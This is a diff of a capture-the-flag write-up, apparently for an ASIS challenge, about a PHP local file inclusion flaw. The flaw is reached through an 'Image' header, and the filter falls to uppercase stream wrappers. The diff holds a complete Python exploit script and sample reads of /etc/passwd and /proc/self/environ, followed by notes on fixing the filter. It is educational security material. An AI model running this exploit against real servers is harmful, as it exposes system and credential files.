+</span><span id="__span-2-9"><a id="__codelineno-2-9" name="__codelineno-2-9" href="#__codelineno-2-9"></a><span class="n">read_file</span><span class="p">(</span><span class="s2">&quot;/flag.txt&quot;</span><span class="p">)</span>           <span class="c1"># Not found</span>
+</span><span id="__span-2-10"><a id="__codelineno-2-10" name="__codelineno-2-10" href="#__codelineno-2-10"></a><span class="n">read_file</span><span class="p">(</span><span class="s2">&quot;/etc/passwd&quot;</span><span class="p">)</span>         <span class="c1"># Blocked by &quot;passwd&quot; filter</span>
+</span><span id="__span-2-11"><a id="__codelineno-2-11" name="__codelineno-2-11" href="#__codelineno-2-11"></a><span class="n">read_file</span><span class="p">(</span><span class="s2">&quot;/proc/self/environ&quot;</span><span class="p">)</span>  <span class="c1"># Found, but no flag</span>
+</span><span id="__span-2-12"><a id="__codelineno-2-12" name="__codelineno-2-12" href="#__codelineno-2-12"></a><span class="n">read_file</span><span class="p">(</span><span class="s2">&quot;/var/www/flag.txt&quot;</span><span class="p">)</span>   <span class="c1"># Not found</span>
+</span></code></pre></div>
+<p>I kept enumerating different paths. CTF flags are often placed in obvious but sometimes overlooked locations. After trying several standard paths, I checked <code>/tmp/</code>:</p>
 <div class="language-python highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="n">content</span> <span class="o">=</span> <span class="n">read_file</span><span class="p">(</span><span class="s2">&quot;/tmp/flag.txt&quot;</span><span class="p">)</span>
 </span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a><span class="nb">print</span><span class="p">(</span><span class="n">content</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
 </span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a><span class="c1"># ASIS{...}</span>
 </span></code></pre></div>
-<h2 id="final-exploit-script">Final Exploit Script<a class="headerlink" href="#final-exploit-script" title="Permanent link">&para;</a></h2>
+<p>There it was. The flag was sitting in <code>/tmp/flag.txt</code> the whole time.</p>
+<h2 id="the-exploit">The Exploit<a class="headerlink" href="#the-exploit" title="Permanent link">&para;</a></h2>
+<p>Here's the final exploit script:</p>
 <div class="language-python highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="ch">#!/usr/bin/env python3</span>
 </span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a><span class="kn">import</span><span class="w"> </span><span class="nn">requests</span>
 </span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a><span class="kn">import</span><span class="w"> </span><span class="nn">base64</span>
 </span><span id="__span-4-4"><a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a><span class="kn">import</span><span class="w"> </span><span class="nn">sys</span>
 </span><span id="__span-4-5"><a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a>
 </span><span id="__span-4-6"><a id="__codelineno-4-6" name="__codelineno-4-6" href="#__codelineno-4-6"></a><span class="k">def</span><span class="w"> </span><span class="nf">read_file</span><span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">path</span><span class="p">):</span>
-</span><span id="__span-4-7"><a id="__codelineno-4-7" name="__codelineno-4-7" href="#__codelineno-4-7"></a><span class="w">    </span><span class="sd">&quot;&quot;&quot;Read a file via LFI vulnerability.&quot;&quot;&quot;</span>
-</span><span id="__span-4-8"><a id="__codelineno-4-8" name="__codelineno-4-8" href="#__codelineno-4-8"></a>    <span class="k">if</span> <span class="ow">not</span> <span class="n">target</span><span class="o">.</span><span class="n">endswith</span><span class="p">(</span><span class="s1">&#39;.php&#39;</span><span class="p">):</span>
-</span><span id="__span-4-9"><a id="__codelineno-4-9" name="__codelineno-4-9" href="#__codelineno-4-9"></a>        <span class="n">target</span> <span class="o">=</span> <span class="n">target</span><span class="o">.</span><span class="n">rstrip</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">)</span> <span class="o">+</span> <span class="s1">&#39;/index.php&#39;</span>
-</span><span id="__span-4-10"><a id="__codelineno-4-10" name="__codelineno-4-10" href="#__codelineno-4-10"></a>
-</span><span id="__span-4-11"><a id="__codelineno-4-11" name="__codelineno-4-11" href="#__codelineno-4-11"></a>    <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&quot;Image&quot;</span><span class="p">:</span> <span class="n">path</span><span class="p">}</span>
-</span><span id="__span-4-12"><a id="__codelineno-4-12" name="__codelineno-4-12" href="#__codelineno-4-12"></a>    <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">10</span><span class="p">)</span>
-</span><span id="__span-4-13"><a id="__codelineno-4-13" name="__codelineno-4-13" href="#__codelineno-4-13"></a>
-</span><span id="__span-4-14"><a id="__codelineno-4-14" name="__codelineno-4-14" href="#__codelineno-4-14"></a>    <span class="c1"># Check for error response</span>
-</span><span id="__span-4-15"><a id="__codelineno-4-15" name="__codelineno-4-15" href="#__codelineno-4-15"></a>    <span class="k">if</span> <span class="s1">&#39;&lt;br /&gt;&#39;</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span> <span class="ow">or</span> <span class="s1">&#39;Warning&#39;</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
-</span><span id="__span-4-16"><a id="__codelineno-4-16" name="__codelineno-4-16" href="#__codelineno-4-16"></a>        <span class="k">return</span> <span class="kc">None</span>
-</span><span id="__span-4-17"><a id="__codelineno-4-17" name="__codelineno-4-17" href="#__codelineno-4-17"></a>
-</span><span id="__span-4-18"><a id="__codelineno-4-18" name="__codelineno-4-18" href="#__codelineno-4-18"></a>    <span class="k">try</span><span class="p">:</span>
-</span><span id="__span-4-19"><a id="__codelineno-4-19" name="__codelineno-4-19" href="#__codelineno-4-19"></a>        <span class="n">decoded</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="o">.</span><span class="n">strip</span><span class="p">())</span>
-</span><span id="__span-4-20"><a id="__codelineno-4-20" name="__codelineno-4-20" href="#__codelineno-4-20"></a>        <span class="k">if</span> <span class="sa">b</span><span class="s1">&#39;Warning&#39;</span> <span class="ow">in</span> <span class="n">decoded</span><span class="p">:</span>
-</span><span id="__span-4-21"><a id="__codelineno-4-21" name="__codelineno-4-21" href="#__codelineno-4-21"></a>            <span class="k">return</span> <span class="kc">None</span>
-</span><span id="__span-4-22"><a id="__codelineno-4-22" name="__codelineno-4-22" href="#__codelineno-4-22"></a>        <span class="k">return</span> <span class="n">decoded</span>
-</span><span id="__span-4-23"><a id="__codelineno-4-23" name="__codelineno-4-23" href="#__codelineno-4-23"></a>    <span class="k">except</span><span class="p">:</span>
-</span><span id="__span-4-24"><a id="__codelineno-4-24" name="__codelineno-4-24" href="#__codelineno-4-24"></a>        <span class="k">return</span> <span class="kc">None</span>
-</span><span id="__span-4-25"><a id="__codelineno-4-25" name="__codelineno-4-25" href="#__codelineno-4-25"></a>
-</span><span id="__span-4-26"><a id="__codelineno-4-26" name="__codelineno-4-26" href="#__codelineno-4-26"></a><span class="k">def</span><span class="w"> </span><span class="nf">main</span><span class="p">():</span>
-</span><span id="__span-4-27"><a id="__codelineno-4-27" name="__codelineno-4-27" href="#__codelineno-4-27"></a>    <span class="n">target</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">1</span> <span class="k">else</span> <span class="s2">&quot;http://target:8080/&quot;</span>
-</span><span id="__span-4-28"><a id="__codelineno-4-28" name="__codelineno-4-28" href="#__codelineno-4-28"></a>
-</span><span id="__span-4-29"><a id="__codelineno-4-29" name="__codelineno-4-29" href="#__codelineno-4-29"></a>    <span class="c1"># Read the flag</span>
-</span><span id="__span-4-30"><a id="__codelineno-4-30" name="__codelineno-4-30" href="#__codelineno-4-30"></a>    <span class="n">flag</span> <span class="o">=</span> <span class="n">read_file</span><span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="s2">&quot;/tmp/flag.txt&quot;</span><span class="p">)</span>
-</span><span id="__span-4-31"><a id="__codelineno-4-31" name="__codelineno-4-31" href="#__codelineno-4-31"></a>
-</span><span id="__span-4-32"><a id="__codelineno-4-32" name="__codelineno-4-32" href="#__codelineno-4-32"></a>    <span class="k">if</span> <span class="n">flag</span><span class="p">:</span>
-</span><span id="__span-4-33"><a id="__codelineno-4-33" name="__codelineno-4-33" href="#__codelineno-4-33"></a>        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;[+] FLAG: </span><span class="si">{</span><span class="n">flag</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
-</span><span id="__span-4-34"><a id="__codelineno-4-34" name="__codelineno-4-34" href="#__codelineno-4-34"></a>    <span class="k">else</span><span class="p">:</span>
-</span><span id="__span-4-35"><a id="__codelineno-4-35" name="__codelineno-4-35" href="#__codelineno-4-35"></a>        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;[-] Flag not found at /tmp/flag.txt&quot;</span><span class="p">)</span>
-</span><span id="__span-4-36"><a id="__codelineno-4-36" name="__codelineno-4-36" href="#__codelineno-4-36"></a>
-</span><span id="__span-4-37"><a id="__codelineno-4-37" name="__codelineno-4-37" href="#__codelineno-4-37"></a>        <span class="c1"># Try alternative locations</span>
-</span><span id="__span-4-38"><a id="__codelineno-4-38" name="__codelineno-4-38" href="#__codelineno-4-38"></a>        <span class="n">alternatives</span> <span class="o">=</span> <span class="p">[</span>
-</span><span id="__span-4-39"><a id="__codelineno-4-39" name="__codelineno-4-39" href="#__codelineno-4-39"></a>            <span class="s2">&quot;/flag.txt&quot;</span><span class="p">,</span>
-</span><span id="__span-4-40"><a id="__codelineno-4-40" name="__codelineno-4-40" href="#__codelineno-4-40"></a>            <span class="s2">&quot;/flag&quot;</span><span class="p">,</span>
-</span><span id="__span-4-41"><a id="__codelineno-4-41" name="__codelineno-4-41" href="#__codelineno-4-41"></a>            <span class="s2">&quot;/home/flag.txt&quot;</span><span class="p">,</span>
-</span><span id="__span-4-42"><a id="__codelineno-4-42" name="__codelineno-4-42" href="#__codelineno-4-42"></a>            <span class="s2">&quot;/var/www/flag.txt&quot;</span><span class="p">,</span>
-</span><span id="__span-4-43"><a id="__codelineno-4-43" name="__codelineno-4-43" href="#__codelineno-4-43"></a>            <span class="s2">&quot;/root/flag.txt&quot;</span><span class="p">,</span>
-</span><span id="__span-4-44"><a id="__codelineno-4-44" name="__codelineno-4-44" href="#__codelineno-4-44"></a>        <span class="p">]</span>
-</span><span id="__span-4-45"><a id="__codelineno-4-45" name="__codelineno-4-45" href="#__codelineno-4-45"></a>
-</span><span id="__span-4-46"><a id="__codelineno-4-46" name="__codelineno-4-46" href="#__codelineno-4-46"></a>        <span class="k">for</span> <span class="n">path</span> <span class="ow">in</span> <span class="n">alternatives</span><span class="p">:</span>
-</span><span id="__span-4-47"><a id="__codelineno-4-47" name="__codelineno-4-47" href="#__codelineno-4-47"></a>            <span class="n">content</span> <span class="o">=</span> <span class="n">read_file</span><span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">path</span><span class="p">)</span>
-</span><span id="__span-4-48"><a id="__codelineno-4-48" name="__codelineno-4-48" href="#__codelineno-4-48"></a>            <span class="k">if</span> <span class="n">content</span><span class="p">:</span>
-</span><span id="__span-4-49"><a id="__codelineno-4-49" name="__codelineno-4-49" href="#__codelineno-4-49"></a>                <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;[+] Found at </span><span class="si">{</span><span class="n">path</span><span class="si">}</span><span class="s2">: </span><span class="si">{</span><span class="n">content</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
-</span><span id="__span-4-50"><a id="__codelineno-4-50" name="__codelineno-4-50" href="#__codelineno-4-50"></a>                <span class="k">break</span>
-</span><span id="__span-4-51"><a id="__codelineno-4-51" name="__codelineno-4-51" href="#__codelineno-4-51"></a>
-</span><span id="__span-4-52"><a id="__codelineno-4-52" name="__codelineno-4-52" href="#__codelineno-4-52"></a><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&quot;__main__&quot;</span><span class="p">:</span>
-</span><span id="__span-4-53"><a id="__codelineno-4-53" name="__codelineno-4-53" href="#__codelineno-4-53"></a>    <span class="n">main</span><span class="p">()</span>
+</span><span id="__span-4-7"><a id="__codelineno-4-7" name="__codelineno-4-7" href="#__codelineno-4-7"></a>    <span class="k">if</span> <span class="ow">not</span> <span class="n">target</span><span class="o">.</span><span class="n">endswith</span><span class="p">(</span><span class="s1">&#39;.php&#39;</span><span class="p">):</span>
+</span><span id="__span-4-8"><a id="__codelineno-4-8" name="__codelineno-4-8" href="#__codelineno-4-8"></a>        <span class="n">target</span> <span class="o">=</span> <span class="n">target</span><span class="o">.</span><span class="n">rstrip</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">)</span> <span class="o">+</span> <span class="s1">&#39;/index.php&#39;</span>
+</span><span id="__span-4-9"><a id="__codelineno-4-9" name="__codelineno-4-9" href="#__codelineno-4-9"></a>
+</span><span id="__span-4-10"><a id="__codelineno-4-10" name="__codelineno-4-10" href="#__codelineno-4-10"></a>    <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&quot;Image&quot;</span><span class="p">:</span> <span class="n">path</span><span class="p">}</span>
+</span><span id="__span-4-11"><a id="__codelineno-4-11" name="__codelineno-4-11" href="#__codelineno-4-11"></a>    <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">10</span><span class="p">)</span>
+</span><span id="__span-4-12"><a id="__codelineno-4-12" name="__codelineno-4-12" href="#__codelineno-4-12"></a>
+</span><span id="__span-4-13"><a id="__codelineno-4-13" name="__codelineno-4-13" href="#__codelineno-4-13"></a>    <span class="c1"># Check for error response</span>
+</span><span id="__span-4-14"><a id="__codelineno-4-14" name="__codelineno-4-14" href="#__codelineno-4-14"></a>    <span class="k">if</span> <span class="s1">&#39;&lt;br /&gt;&#39;</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span> <span class="ow">or</span> <span class="s1">&#39;Warning&#39;</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
+</span><span id="__span-4-15"><a id="__codelineno-4-15" name="__codelineno-4-15" href="#__codelineno-4-15"></a>        <span class="k">return</span> <span class="kc">None</span>
+</span><span id="__span-4-16"><a id="__codelineno-4-16" name="__codelineno-4-16" href="#__codelineno-4-16"></a>
+</span><span id="__span-4-17"><a id="__codelineno-4-17" name="__codelineno-4-17" href="#__codelineno-4-17"></a>    <span class="k">try</span><span class="p">:</span>
+</span><span id="__span-4-18"><a id="__codelineno-4-18" name="__codelineno-4-18" href="#__codelineno-4-18"></a>        <span class="n">decoded</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="o">.</span><span class="n">strip</span><span class="p">())</span>
+</span><span id="__span-4-19"><a id="__codelineno-4-19" name="__codelineno-4-19" href="#__codelineno-4-19"></a>        <span class="k">if</span> <span class="sa">b</span><span class="s1">&#39;Warning&#39;</span> <span class="ow">in</span> <span class="n">decoded</span><span class="p">:</span>
+</span><span id="__span-4-20"><a id="__codelineno-4-20" name="__codelineno-4-20" href="#__codelineno-4-20"></a>            <span class="k">return</span> <span class="kc">None</span>
+</span><span id="__span-4-21"><a id="__codelineno-4-21" name="__codelineno-4-21" href="#__codelineno-4-21"></a>        <span class="k">return</span> <span class="n">decoded</span>
+</span><span id="__span-4-22"><a id="__codelineno-4-22" name="__codelineno-4-22" href="#__codelineno-4-22"></a>    <span class="k">except</span><span class="p">:</span>
+</span><span id="__span-4-23"><a id="__codelineno-4-23" name="__codelineno-4-23" href="#__codelineno-4-23"></a>        <span class="k">return</span> <span class="kc">None</span>
+</span><span id="__span-4-24"><a id="__codelineno-4-24" name="__codelineno-4-24" href="#__codelineno-4-24"></a>
+</span><span id="__span-4-25"><a id="__codelineno-4-25" name="__codelineno-4-25" href="#__codelineno-4-25"></a><span class="k">def</span><span class="w"> </span><span class="nf">main</span><span class="p">():</span>
+</span><span id="__span-4-26"><a id="__codelineno-4-26" name="__codelineno-4-26" href="#__codelineno-4-26"></a>    <span class="n">target</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">1</span> <span class="k">else</span> <span class="s2">&quot;http://target:8080/&quot;</span>
+</span><span id="__span-4-27"><a id="__codelineno-4-27" name="__codelineno-4-27" href="#__codelineno-4-27"></a>
+</span><span id="__span-4-28"><a id="__codelineno-4-28" name="__codelineno-4-28" href="#__codelineno-4-28"></a>    <span class="c1"># Read the flag</span>
+</span><span id="__span-4-29"><a id="__codelineno-4-29" name="__codelineno-4-29" href="#__codelineno-4-29"></a>    <span class="n">flag</span> <span class="o">=</span> <span class="n">read_file</span><span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="s2">&quot;/tmp/flag.txt&quot;</span><span class="p">)</span>
+</span><span id="__span-4-30"><a id="__codelineno-4-30" name="__codelineno-4-30" href="#__codelineno-4-30"></a>
+</span><span id="__span-4-31"><a id="__codelineno-4-31" name="__codelineno-4-31" href="#__codelineno-4-31"></a>    <span class="k">if</span> <span class="n">flag</span><span class="p">:</span>
+</span><span id="__span-4-32"><a id="__codelineno-4-32" name="__codelineno-4-32" href="#__codelineno-4-32"></a>        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;[+] FLAG: </span><span class="si">{</span><span class="n">flag</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+</span><span id="__span-4-33"><a id="__codelineno-4-33" name="__codelineno-4-33" href="#__codelineno-4-33"></a>    <span class="k">else</span><span class="p">:</span>
+</span><span id="__span-4-34"><a id="__codelineno-4-34" name="__codelineno-4-34" href="#__codelineno-4-34"></a>        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;[-] Flag not found at /tmp/flag.txt&quot;</span><span class="p">)</span>
+</span><span id="__span-4-35"><a id="__codelineno-4-35" name="__codelineno-4-35" href="#__codelineno-4-35"></a>
+</span><span id="__span-4-36"><a id="__codelineno-4-36" name="__codelineno-4-36" href="#__codelineno-4-36"></a>        <span class="c1"># Try alternative locations</span>
+</span><span id="__span-4-37"><a id="__codelineno-4-37" name="__codelineno-4-37" href="#__codelineno-4-37"></a>        <span class="n">alternatives</span> <span class="o">=</span> <span class="p">[</span>
+</span><span id="__span-4-38"><a id="__codelineno-4-38" name="__codelineno-4-38" href="#__codelineno-4-38"></a>            <span class="s2">&quot;/flag.txt&quot;</span><span class="p">,</span>
+</span><span id="__span-4-39"><a id="__codelineno-4-39" name="__codelineno-4-39" href="#__codelineno-4-39"></a>            <span class="s2">&quot;/flag&quot;</span><span class="p">,</span>
+</span><span id="__span-4-40"><a id="__codelineno-4-40" name="__codelineno-4-40" href="#__codelineno-4-40"></a>            <span class="s2">&quot;/home/flag.txt&quot;</span><span class="p">,</span>
+</span><span id="__span-4-41"><a id="__codelineno-4-41" name="__codelineno-4-41" href="#__codelineno-4-41"></a>            <span class="s2">&quot;/var/www/flag.txt&quot;</span><span class="p">,</span>
+</span><span id="__span-4-42"><a id="__codelineno-4-42" name="__codelineno-4-42" href="#__codelineno-4-42"></a>            <span class="s2">&quot;/root/flag.txt&quot;</span><span class="p">,</span>
+</span><span id="__span-4-43"><a id="__codelineno-4-43" name="__codelineno-4-43" href="#__codelineno-4-43"></a>        <span class="p">]</span>
+</span><span id="__span-4-44"><a id="__codelineno-4-44" name="__codelineno-4-44" href="#__codelineno-4-44"></a>
+</span><span id="__span-4-45"><a id="__codelineno-4-45" name="__codelineno-4-45" href="#__codelineno-4-45"></a>        <span class="k">for</span> <span class="n">path</span> <span class="ow">in</span> <span class="n">alternatives</span><span class="p">:</span>
+</span><span id="__span-4-46"><a id="__codelineno-4-46" name="__codelineno-4-46" href="#__codelineno-4-46"></a>            <span class="n">content</span> <span class="o">=</span> <span class="n">read_file</span><span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">path</span><span class="p">)</span>
+</span><span id="__span-4-47"><a id="__codelineno-4-47" name="__codelineno-4-47" href="#__codelineno-4-47"></a>            <span class="k">if</span> <span class="n">content</span><span class="p">:</span>
+</span><span id="__span-4-48"><a id="__codelineno-4-48" name="__codelineno-4-48" href="#__codelineno-4-48"></a>                <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;[+] Found at </span><span class="si">{</span><span class="n">path</span><span class="si">}</span><span class="s2">: </span><span class="si">{</span><span class="n">content</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+</span><span id="__span-4-49"><a id="__codelineno-4-49" name="__codelineno-4-49" href="#__codelineno-4-49"></a>                <span class="k">break</span>
+</span><span id="__span-4-50"><a id="__codelineno-4-50" name="__codelineno-4-50" href="#__codelineno-4-50"></a>
+</span><span id="__span-4-51"><a id="__codelineno-4-51" name="__codelineno-4-51" href="#__codelineno-4-51"></a><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&quot;__main__&quot;</span><span class="p">:</span>
+</span><span id="__span-4-52"><a id="__codelineno-4-52" name="__codelineno-4-52" href="#__codelineno-4-52"></a>    <span class="n">main</span><span class="p">()</span>
 </span></code></pre></div>
-<h2 id="key-takeaways">Key Takeaways<a class="headerlink" href="#key-takeaways" title="Permanent link">&para;</a></h2>
-<h3 id="1-case-sensitivity-matters">1. Case-Sensitivity Matters<a class="headerlink" href="#1-case-sensitivity-matters" title="Permanent link">&para;</a></h3>
-<p>PHP stream wrappers (<code>php://</code>, <code>file://</code>, <code>http://</code>, etc.) are case-insensitive. Filters that only block lowercase versions can be bypassed with uppercase variants.</p>
-<h3 id="2-file_get_contents-is-dangerous">2. file_get_contents() is Dangerous<a class="headerlink" href="#2-file_get_contents-is-dangerous" title="Permanent link">&para;</a></h3>
-<p>When user input is passed to <code>file_get_contents()</code>, it creates an LFI vulnerability that can read arbitrary files on the system.</p>
-<h3 id="3-always-check-common-locations">3. Always Check Common Locations<a class="headerlink" href="#3-always-check-common-locations" title="Permanent link">&para;</a></h3>
-<p>Don't overlook simple paths like <code>/tmp/</code>. CTF flags are often placed in:
-- <code>/tmp/flag.txt</code>
-- <code>/flag.txt</code>
-- <code>/flag</code>
-- <code>/home/*/flag.txt</code>
-- Environment variables (<code>/proc/self/environ</code>)</p>
-<h3 id="4-error-based-detection">4. Error-Based Detection<a class="headerlink" href="#4-error-based-detection" title="Permanent link">&para;</a></h3>
-<p>By checking if the response contains HTML error messages (<code>&lt;br /&gt;</code>, <code>Warning</code>), we can determine if a file exists or not - useful for blind enumeration.</p>
-<h2 id="tools-techniques-used">Tools &amp; Techniques Used<a class="headerlink" href="#tools-techniques-used" title="Permanent link">&para;</a></h2>
-<ol>
-<li><strong>Source Code Analysis</strong> - Understanding the filter logic</li>
-<li><strong>Protocol Wrapper Bypass</strong> - Case-insensitive wrapper abuse</li>
-<li><strong>LFI Exploitation</strong> - Reading arbitrary files</li>
-<li><strong>Systematic Enumeration</strong> - Checking multiple file locations</li>
-<li><strong>Error-Based Oracle</strong> - Detecting file existence via error messages</li>
-</ol>
+<h2 id="what-i-learned">What I Learned<a class="headerlink" href="#what-i-learned" title="Permanent link">&para;</a></h2>
+<p>This challenge reinforced a few important lessons:</p>
+<p><strong>Case Sensitivity Matters:</strong> Security filters need to handle case variations. In PHP's case, stream wrappers like <code>php://</code>, <code>file://</code>, and <code>data://</code> are case-insensitive, so <code>PHP://</code>, <code>FILE://</code>, and <code>DATA://</code> work identically. A proper filter would convert input to lowercase before checking, or use case-insensitive string matching.</p>
+<p><strong>file_get_contents() is Dangerous:</strong> When user input flows into <code>file_get_contents()</code> without proper validation, it creates a local file inclusion vulnerability. The function accepts both regular file paths and PHP stream wrappers, making it especially risky.</p>
+<p><strong>Don't Overlook Simple Paths:</strong> I spent time trying complicated paths and wrappers when the flag was just sitting in <code>/tmp/flag.txt</code>. In CTFs, flags are often in obvious locations like <code>/tmp/</code>, <code>/flag.txt</code>, or the application's home directory.</p>
+<p><strong>Error-Based Detection:</strong> By checking if the response contained PHP error messages like <code>&lt;br /&gt;</code> or <code>Warning</code>, I could determine whether a file existed or not. This is useful for blind enumeration when you don't get the file contents directly.</p>
+<p>Sometimes the simplest vulnerabilities are the most effective. A single character difference (lowercase vs uppercase) was all it took to bypass the security filter.</p>
 <h2 id="references">References<a class="headerlink" href="#references" title="Permanent link">&para;</a></h2>
 <ul>
-<li><a href="https://www.php.net/manual/en/wrappers.php">PHP Stream Wrappers</a></li>
+<li><a href="https://www.php.net/manual/en/wrappers.php">PHP Stream Wrappers Documentation</a></li>
 <li><a href="https://book.hacktricks.xyz/pentesting-web/file-inclusion">HackTricks - File Inclusion</a></li>
 <li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion">PayloadsAllTheThings - File Inclusion</a></li>
 </ul>
-<h2 id="flag">Flag<a class="headerlink" href="#flag" title="Permanent link">&para;</a></h2>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>ASIS{...}
-</span></code></pre></div>
 
 
 
